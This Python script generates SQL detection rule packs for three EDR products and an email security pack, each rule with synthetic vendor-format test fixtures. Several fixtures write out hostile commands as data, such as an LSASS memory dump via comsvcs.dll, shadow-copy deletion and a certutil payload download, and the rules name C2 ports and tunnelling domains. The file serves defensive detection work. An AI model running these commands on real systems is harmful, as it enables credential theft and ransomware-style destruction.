"""Generates rule-packs/{crowdstrike,defender,sentinelone,email}/pack.yaml (setup/43_edr_email.sql).

The three EDR packs share one behavioural rule set: every EDR maps into the same CIM tables, so a rule
differs only in its vendor filter and its fixtures, which are each vendor's own raw records sent through
OTLP (a canary exercises ingest, the vendor mapping and the rule together).

    python3 scripts/gen_edr_packs.py
"""
from gen_rule_packs import E, ROOT, dump, otel, rule

HOST = "WS-" + E          # the canary marker reaches src/dest through the host name


# ------------------------------------------------------------------ vendor-native record builders
def cs(kind, **f):
    """CrowdStrike FDR (event_simpleName) or Event Streams (metadata.eventType)."""
    if kind == "alert":
        return {"metadata": {"eventType": "DetectionSummaryEvent"},
                "event": {"ComputerName": HOST, "UserName": E, "Severity": f.get("severity", 5),
                          "DetectName": f.get("name", "Credential Theft"), "Description": f.get("desc", "lsass dump"),
                          "Tactic": "Credential Access", "Technique": "OS Credential Dumping", "LocalIP": "10.0.0.5"}}
    base = {"ComputerName": HOST, "UserName": E, "event_platform": "Win", "aid": "aid-1"}
    if kind == "proc":
        return {**base, "event_simpleName": "ProcessRollup2", "ImageFileName":
                "\\Device\\HarddiskVolume3" + f["path"].split(":", 1)[1], "CommandLine": f["cmd"],
                "ParentBaseFileName": f.get("parent", "explorer.exe"), "TargetProcessId": "4242"}
    if kind == "net":
        return {**base, "event_simpleName": "NetworkConnectIP4", "LocalAddressIP4": "10.0.0.5", "LocalPort": "50123",
                "RemoteAddressIP4": f["ip"], "RemotePort": str(f["port"]), "Protocol": "6",
                "ContextBaseFileName": f.get("proc", "rundll32.exe")}
    if kind == "dns":
        return {**base, "event_simpleName": "DnsRequest", "DomainName": f["domain"], "RequestType": "1",
                "ContextBaseFileName": f.get("proc", "powershell.exe")}
    if kind == "file":
        return {**base, "event_simpleName": "NewExecutableWritten",
                "TargetFileName": "\\Device\\HarddiskVolume3" + f["path"].split(":", 1)[1],
                "ContextBaseFileName": f.get("proc", "powershell.exe")}


def mde(kind, **f):
    """Microsoft Defender for Endpoint Advanced Hunting streaming record."""
    if kind == "alert":
        return {"category": "AdvancedHunting-AlertInfo",
                "properties": {"Title": f.get("name", "Credential Theft") + ": " + f.get("desc", "lsass dump"),
                               "Severity": f.get("sev_name", "High"), "Category": "CredentialAccess",
                               "DeviceName": HOST, "AccountName": E, "AlertId": "da1"}}
    if kind == "proc":
        name = f["path"].rsplit("\\", 1)[1]
        return {"category": "AdvancedHunting-DeviceProcessEvents",
                "properties": {"DeviceName": HOST, "AccountName": E, "ActionType": "ProcessCreated", "FileName": name,
                               "FolderPath": f["path"], "ProcessCommandLine": f["cmd"],
                               "InitiatingProcessFileName": f.get("parent", "explorer.exe"), "ProcessId": 4242}}
    if kind == "net":
        return {"category": "AdvancedHunting-DeviceNetworkEvents",
                "properties": {"DeviceName": HOST, "ActionType": "ConnectionSuccess", "RemoteIP": f["ip"],
                               "RemotePort": f["port"], "LocalIP": "10.0.0.5", "LocalPort": 50123, "Protocol": "Tcp",
                               "InitiatingProcessFileName": f.get("proc", "rundll32.exe")}}
    if kind == "dns":
        return {"category": "AdvancedHunting-DeviceEvents",
                "properties": {"DeviceName": HOST, "ActionType": "DnsQueryResponse",
                               "AdditionalFields": {"DnsQueryString": f["domain"]},
                               "InitiatingProcessFileName": f.get("proc", "powershell.exe")}}
    if kind == "file":
        return {"category": "AdvancedHunting-DeviceFileEvents",
                "properties": {"DeviceName": HOST, "InitiatingProcessAccountName": E, "ActionType": "FileCreated",
                               "FileName": f["path"].rsplit("\\", 1)[1], "FolderPath": f["path"],
                               "InitiatingProcessFileName": f.get("proc", "powershell.exe")}}


def s1(kind, **f):
    """SentinelOne Cloud Funnel (dotted keys) or threats API."""
    if kind == "alert":
        return {"threatInfo": {"threatName": f.get("name", "Credential Theft"), "classification": f.get("desc", "lsass dump"),
                               "confidenceLevel": "malicious", "threatId": "t1", "processUser": "CORP\\" + E},
                "agentRealtimeInfo": {"agentComputerName": HOST}}
    base = {"endpoint.name": HOST, "endpoint.os": "windows", "src.process.user": "CORP\\" + E}
    if kind == "proc":
        return {**base, "event.type": "Process Creation", "tgt.process.image.path": f["path"], "tgt.process.cmdline": f["cmd"],
                "src.process.image.path": "C:\\Windows\\" + f.get("parent", "explorer.exe"), "tgt.process.pid": 4242,
                "tgt.process.user": "CORP\\" + E}
    if kind == "net":
        return {**base, "event.type": "IP Connect", "dst.ip.address": f["ip"], "dst.port.number": f["port"],
                "src.ip.address": "10.0.0.5", "src.port.number": 50123, "event.network.direction": "OUTGOING",
                "src.process.image.path": "C:\\Windows\\System32\\" + f.get("proc", "rundll32.exe")}
    if kind == "dns":
        return {**base, "event.type": "DNS Resolved", "event.dns.request": f["domain"],
                "src.process.image.path": "C:\\Windows\\System32\\" + f.get("proc", "powershell.exe")}
    if kind == "file":
        return {**base, "event.type": "File Creation", "tgt.file.path": f["path"],
                "src.process.image.path": "C:\\Windows\\System32\\" + f.get("proc", "powershell.exe")}


VENDORS = {
    "crowdstrike": ("CrowdStrike Falcon", "CrowdStrike", "CS", cs,
                    "Stream Falcon Data Replicator (FDR) and Event Streams with otel-receiver/collector-examples/"
                    "crowdstrike_fdr.py (service.name crowdstrike)."),
    "defender": ("Microsoft Defender for Endpoint", "Microsoft", "MDE", mde,
                 "Stream Advanced Hunting tables (DeviceProcessEvents, DeviceNetworkEvents, DeviceFileEvents, DeviceEvents, "
                 "AlertInfo) to Event Hubs and ship them with otel-receiver/collector-examples/defender_eventhub.py "
                 "(service.name defender)."),
    "sentinelone": ("SentinelOne", "SentinelOne", "SONE", s1,
                    "Enable Singularity Cloud Funnel to S3 and poll the threats API with otel-receiver/collector-examples/"
                    "sentinelone_funnel.py (service.name sentinelone)."),
}


def proc_sel(vp, desc, where):
    return (f"SELECT _time, user_name, process_name AS src, dest, {desc} AS description\n"
            f"FROM SNOWFLAKE_XDR.RAW_LOGS.ENDPOINT_PROCESSES\nWHERE vendor_product = '{vp}' AND ({where})")


def edr_pack(pid):
    vp, vendor, prefix, b, onboarding = VENDORS[pid]
    fx = lambda kind, **f: otel(pid, b(kind, **f))  # noqa: E731
    pdesc = "process_name || ' on ' || dest || ': ' || LEFT(process, 200)"
    rules = [
        rule(f"{prefix}-001", f"{vp}: high-severity native detection", 4, "TA0002", "T1204",
             "INTRUSION_DETECTION", "The EDR raised a high or critical detection; correlated with every other source.",
             f"SELECT _time, dest AS user_name, src, src AS dest, signature AS description\n"
             f"FROM SNOWFLAKE_XDR.RAW_LOGS.INTRUSION_DETECTION\nWHERE vendor_product = '{vp}' AND severity >= 4",
             [fx("alert")], [fx("alert", severity=2, sev_name="Low", name="PUA", desc="adware")] if pid != "sentinelone"
             else [otel(pid, {**s1("alert"), "threatInfo": {**s1("alert")["threatInfo"], "confidenceLevel": "suspicious"}})]),
        rule(f"{prefix}-002", "Office application spawned a shell", 4, "TA0001", "T1566.001", "ENDPOINT_PROCESSES",
             "Word, Excel, PowerPoint or Outlook started cmd, PowerShell or a script host: the classic macro dropper.",
             proc_sel(vp, pdesc, "parent_process_name IN ('winword.exe', 'excel.exe', 'powerpnt.exe', 'outlook.exe') "
                      "AND process_name IN ('cmd.exe', 'powershell.exe', 'pwsh.exe', 'wscript.exe', 'cscript.exe', 'mshta.exe')"),
             [fx("proc", path="C:\\Windows\\System32\\cmd.exe", cmd="cmd.exe /c whoami", parent="WINWORD.EXE")],
             [fx("proc", path="C:\\Windows\\System32\\cmd.exe", cmd="cmd.exe /c whoami", parent="explorer.exe")]),
        rule(f"{prefix}-003", "Encoded PowerShell command", 3, "TA0002", "T1059.001", "ENDPOINT_PROCESSES",
             "PowerShell started with an encoded command, used to hide payloads.",
             proc_sel(vp, pdesc, "process_name IN ('powershell.exe', 'pwsh.exe') AND "
                      "REGEXP_LIKE(process, '.*\\\\s-(e|en|enc|enco|encodedcommand)\\\\s.*', 'i')"),
             [fx("proc", path="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                 cmd="powershell.exe -nop -w hidden -enc SQBFAFgA")],
             [fx("proc", path="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                 cmd="powershell.exe -File C:\\scripts\\backup.ps1")]),
        rule(f"{prefix}-004", "LSASS memory dump", 5, "TA0006", "T1003.001", "ENDPOINT_PROCESSES",
             "comsvcs.dll MiniDump or procdump against lsass: credential theft.",
             proc_sel(vp, pdesc, "(process ILIKE '%comsvcs%' AND process ILIKE '%minidump%') OR "
                      "(process_name IN ('procdump.exe', 'procdump64.exe') AND process ILIKE '%lsass%')"),
             [fx("proc", path="C:\\Windows\\System32\\rundll32.exe",
                 cmd="rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\l.dmp full")],
             [fx("proc", path="C:\\Windows\\System32\\rundll32.exe", cmd="rundll32.exe shell32.dll,Control_RunDLL")]),
        rule(f"{prefix}-005", "Shadow copies or backups deleted", 5, "TA0040", "T1490", "ENDPOINT_PROCESSES",
             "vssadmin / wmic / wbadmin used to delete recovery data: a ransomware precursor.",
             proc_sel(vp, pdesc, "(process_name = 'vssadmin.exe' AND process ILIKE '%delete%shadows%') OR "
                      "(process_name = 'wmic.exe' AND process ILIKE '%shadowcopy%delete%') OR "
                      "(process_name = 'wbadmin.exe' AND process ILIKE '%delete%catalog%')"),
             [fx("proc", path="C:\\Windows\\System32\\vssadmin.exe", cmd="vssadmin.exe delete shadows /all /quiet")],
             [fx("proc", path="C:\\Windows\\System32\\vssadmin.exe", cmd="vssadmin.exe list shadows")]),
        rule(f"{prefix}-006", "Living-off-the-land download", 3, "TA0011", "T1105", "ENDPOINT_PROCESSES",
             "certutil or bitsadmin used to fetch a file from the internet.",
             proc_sel(vp, pdesc, "(process_name = 'certutil.exe' AND process ILIKE '%urlcache%' AND process ILIKE '%http%') OR "
                      "(process_name = 'bitsadmin.exe' AND process ILIKE '%/transfer%')"),
             [fx("proc", path="C:\\Windows\\System32\\certutil.exe",
                 cmd="certutil.exe -urlcache -split -f http://198.51.100.9/a.exe C:\\Users\\Public\\a.exe")],
             [fx("proc", path="C:\\Windows\\System32\\certutil.exe", cmd="certutil.exe -verify cert.cer")]),
        rule(f"{prefix}-007", "Connection to a common C2 port", 3, "TA0011", "T1571", "NETWORK_TRAFFIC",
             "A system binary connected out to a port typical of reverse shells and C2 frameworks.",
             f"SELECT _time, src AS user_name, src, dest, app || ' -> ' || dest_ip || ':' || dest_port AS description\n"
             f"FROM SNOWFLAKE_XDR.RAW_LOGS.NETWORK_TRAFFIC\nWHERE vendor_product = '{vp}' AND (direction = 'outbound' OR "
             f"direction = 'outgoing') AND dest_port IN (4444, 1337, 8443, 50050, 31337) AND "
             f"app IN ('rundll32.exe', 'regsvr32.exe', 'powershell.exe', 'mshta.exe', 'cmd.exe')",
             [fx("net", ip="203.0.113.66", port=4444)], [fx("net", ip="203.0.113.66", port=443)]),
        rule(f"{prefix}-008", "DNS to a tunnelling or dynamic-DNS service", 3, "TA0011", "T1572", "DNS_ACTIVITY",
             "A host resolved an ngrok, trycloudflare or dynamic-DNS name often used for C2 and exfiltration.",
             f"SELECT _time, src AS user_name, src, dest, query AS description\n"
             f"FROM SNOWFLAKE_XDR.RAW_LOGS.DNS_ACTIVITY\nWHERE vendor_product = '{vp}' AND REGEXP_LIKE(query, "
             f"'.*\\\\.(ngrok\\\\.io|ngrok-free\\\\.app|trycloudflare\\\\.com|duckdns\\\\.org|no-ip\\\\.org|serveo\\\\.net)$', 'i')",
             [fx("dns", domain="a1b2.ngrok-free.app")], [fx("dns", domain="login.microsoftonline.com")]),
        rule(f"{prefix}-009", "Executable dropped in a Startup folder", 4, "TA0003", "T1547.001", "ENDPOINT_FILESYSTEM",
             "A program, script or shortcut was written to a Startup folder so it runs at every logon.",
             f"SELECT _time, user_name, process_name AS src, dest, file_path AS description\n"
             f"FROM SNOWFLAKE_XDR.RAW_LOGS.ENDPOINT_FILESYSTEM\nWHERE vendor_product = '{vp}' AND "
             f"CONTAINS(LOWER(file_path), '\\\\start menu\\\\programs\\\\startup\\\\') AND "
             f"REGEXP_LIKE(file_path, '.*\\\\.(exe|lnk|bat|cmd|vbs|js|ps1|hta)$', 'i')",
             [fx("file", path="C:\\Users\\x\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\upd.exe")],
             [fx("file", path="C:\\Users\\x\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\notes.txt")]),
    ]
    return {"pack_id": pid, "name": vp, "vendor": vendor, "version": 1,
            "description": f"{vp} detections: native high-severity alerts plus behavioural rules (macro droppers, "
                           "encoded PowerShell, LSASS dumps, recovery deletion, LOLBin downloads, C2 ports, tunnelling "
                           "DNS, Startup persistence). The Sigma endpoint pack runs on the same data.",
            "requires": [{"table": "ENDPOINT_PROCESSES", "vendor_product": vp}], "onboarding": onboarding,
            "rules": rules}


# ------------------------------------------------------------------ email
def trace(sender, rcpt, status="Delivered", subject="Invoice", ip="203.0.113.20"):
    return otel("m365_messagetrace", {"SenderAddress": sender, "RecipientAddress": rcpt, "Status": status,
                                      "Subject": subject, "FromIP": ip, "MessageId": "<m1@x>", "Size": 2048,
                                      "Organization": "contoso.com"})


def audit_rule(op, params):
    return otel("m365_audit", {"Operation": op, "UserId": f"{E}@contoso.com", "ClientIP": "198.51.100.77:51000",
                               "Workload": "Exchange", "ResultStatus": "True",
                               "Parameters": [{"Name": k, "Value": v} for k, v in params]})


def tap(kind, classification="malware", url="http://203.0.113.5/inv.zip"):
    b = {"_type": kind, "recipient": [f"{E}@contoso.com"], "sender": "billing@evil.example", "subject": "Overdue invoice",
         "messageID": "<p1@x>"}
    if kind.startswith("clicks"):
        b.update({"url": url, "classification": classification, "clickIP": "198.51.100.80", "threatID": "th1"})
    else:
        b.update({"fromAddress": ["billing@evil.example"], "senderIP": "203.0.113.20",
                  "threatsInfoMap": [{"threat": url, "classification": classification, "threatID": "th1"}]})
    return otel("proofpoint", b)


def email_sel(vp, desc, where):
    return (f"SELECT _time, user_name, src, dest, {desc} AS description\n"
            f"FROM SNOWFLAKE_XDR.RAW_LOGS.EMAIL_ACTIVITY\nWHERE vendor_product = '{vp}' AND ({where})")


EMAIL = {
    "pack_id": "email", "name": "Email Security (Microsoft 365, Proofpoint)", "vendor": "Microsoft / Proofpoint",
    "version": 1,
    "description": "Mailbox takeover (external forwarding and inbox rules), permitted clicks on malicious URLs, "
                   "malicious messages that were delivered, and phishing bursts.",
    "requires": [{"table": "EMAIL_ACTIVITY", "vendor_product": "m365"}],
    "onboarding": "Run otel-receiver/collector-examples/m365_mail.py (message trace + Management Activity API) and "
                  "proofpoint_tap.py (SIEM API).",
    "rules": [
        rule("EM-001", "Inbox rule forwards mail outside the company", 4, "TA0009", "T1114.003", "EMAIL_ACTIVITY",
             "A user created or changed an inbox rule that forwards or redirects mail to an external address.",
             email_sel("m365", "'forwards to ' || forward_to", "action = 'inbox_rule' AND forward_to IS NOT NULL "
                       "AND SPLIT_PART(forward_to, '@', 2) <> dest"),
             [audit_rule("New-InboxRule", [("Name", "x"), ("ForwardTo", "drop@evil.example")])],
             [audit_rule("New-InboxRule", [("Name", "x"), ("ForwardTo", "team@contoso.com")])]),
        rule("EM-002", "Mailbox forwarding set to an external address", 4, "TA0009", "T1114.003", "EMAIL_ACTIVITY",
             "Set-Mailbox ForwardingSmtpAddress points the whole mailbox at an outside domain.",
             email_sel("m365", "'mailbox forwarding to ' || forward_to", "action = 'forwarding_set' AND forward_to IS NOT NULL "
                       "AND SPLIT_PART(REPLACE(forward_to, 'smtp:', ''), '@', 2) <> dest"),
             [audit_rule("Set-Mailbox", [("ForwardingSmtpAddress", "smtp:drop@evil.example")])],
             [audit_rule("Set-Mailbox", [("ForwardingSmtpAddress", "smtp:archive@contoso.com")])]),
        rule("EM-003", "User clicked a malicious link that was allowed", 4, "TA0001", "T1204.001", "EMAIL_ACTIVITY",
             "Proofpoint permitted a click on a URL it later classified as malicious or phishing.",
             email_sel("proofpoint", "'clicked ' || LEFT(url, 200)", "action = 'click' AND verdict IN ('malware', 'phish')"),
             [tap("clicksPermitted")], [tap("clicksPermitted", classification="spam")]),
        rule("EM-004", "Malicious message delivered to a mailbox", 3, "TA0001", "T1566.001", "EMAIL_ACTIVITY",
             "A message carrying a known malicious URL or attachment reached the inbox.",
             email_sel("proofpoint", "'delivered from ' || sender || ': ' || LEFT(subject, 120)",
                       "action = 'delivered' AND verdict IN ('malware', 'phish')"),
             [tap("messagesDelivered")], [tap("messagesBlocked")]),
        rule("EM-005", "Phishing burst from one external sender", 3, "TA0001", "T1566", "EMAIL_ACTIVITY",
             "One outside sender reached many inboxes in a short window.",
             "SELECT MAX(_time) AS _time, MIN(user_name) AS user_name, ANY_VALUE(src) AS src, sender AS dest,\n"
             "       sender || ' mailed ' || COUNT(DISTINCT recipient) || ' recipients' AS description\n"
             "FROM SNOWFLAKE_XDR.RAW_LOGS.EMAIL_ACTIVITY\n"
             "WHERE vendor_product = 'm365' AND direction = 'inbound' AND action = 'delivered'\n"
             "GROUP BY sender, TIME_SLICE(_time::TIMESTAMP_NTZ, 15, 'MINUTE')\nHAVING COUNT(DISTINCT recipient) >= 10",
             [trace(f"hr-{E}@evil.example", f"{E}{i}@contoso.com") for i in range(12)],
             [trace(f"hr-{E}@evil.example", f"{E}0@contoso.com")]),
    ],
}

if __name__ == "__main__":
    for p in [edr_pack(v) for v in VENDORS] + [EMAIL]:
        d = ROOT / "rule-packs" / p["pack_id"]
        d.mkdir(parents=True, exist_ok=True)
        (d / "pack.yaml").write_text(dump(p))
        print(f"{p['pack_id']}: {len(p['rules'])} rules")
